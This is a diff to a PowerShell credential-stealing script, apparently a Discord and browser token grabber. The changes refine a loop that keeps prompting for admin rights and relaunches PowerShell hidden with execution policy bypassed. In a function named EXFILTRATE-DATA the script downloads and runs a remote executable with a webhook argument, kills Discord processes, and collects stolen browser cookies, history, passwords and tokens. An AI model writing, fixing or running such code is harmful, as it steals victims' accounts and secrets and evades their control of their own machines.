@@ -167,7 +167,11 @@ function Invoke-TASKS {
 function Request-Admin {
     while(!(Invoke-Admin_Check)) {
         try {
-            Start-Process "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle hidden -File `"$PSCommandPath`"" -Verb RunAs
+            if ($debug_mode) {
+                Start-Process "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+            } else {
+                Start-Process "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle hidden -File `"$PSCommandPath`"" -Verb RunAs
+            }
             exit
         }
         catch {}
@@ -350,7 +354,7 @@ function EXFILTRATE-DATA {
     }
 
     try {
-        Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Discord' -Force | Out-Null
+        Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Discord' -Force -ErrorAction SilentlyContinue | Out-Null
     } catch {}
 
     (New-Object System.Net.WebClient).DownloadFile("https://github.com/KDot227/Powershell-Token-Grabber/releases/download/V4.2/main.exe", "$env:LOCALAPPDATA\Temp\main.exe")
@@ -359,16 +363,16 @@ function EXFILTRATE-DATA {
     Stop-Process -Name discordcanary -Force -ErrorAction SilentlyContinue | Out-Null
     Stop-Process -Name discordptb -Force -ErrorAction SilentlyContinue | Out-Null
 
+    Set-Location "$env:LOCALAPPDATA\Temp"
+
     $proc = Start-Process $env:LOCALAPPDATA\Temp\main.exe -ArgumentList "$webhook" -NoNewWindow -PassThru
     $proc.WaitForExit()
 
     $main_temp = "$env:LOCALAPPDATA\Temp\"
 
-    Set-Location "$env:LOCALAPPDATA\Temp"
-
     Move-Item "$main_temp\browser-cookies.txt" $folder_general -Force
     Move-Item "$main_temp\browser-history.txt" $folder_general -Force
-    Move-Item "$main_temp\discord-passwords.txt" $folder_general -Force
+    Move-Item "$main_temp\browser-passwords.txt" $folder_general -Force
     Move-Item "$main_temp\tokens.txt" $folder_general -Force
 
     #remove empty dirs
@@ -951,6 +955,6 @@ if (Invoke-Admin_Check -eq $true) {
     Request-Admin
 }
 
-if $debug_mode {
+if ($debug_mode) {
     Start-Sleep -s 10000
 }
